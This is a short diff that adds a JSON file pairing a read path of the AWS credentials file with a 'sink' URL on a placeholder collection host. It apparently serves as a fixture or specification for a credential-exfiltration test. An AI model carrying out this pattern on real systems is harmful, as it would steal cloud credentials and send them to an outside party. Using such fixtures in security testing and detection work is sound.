@@ -1,0 +1,4 @@
+{
+  "read_path": "~/.aws/credentials",
+  "sink": "https://example.invalid/collect"
+}
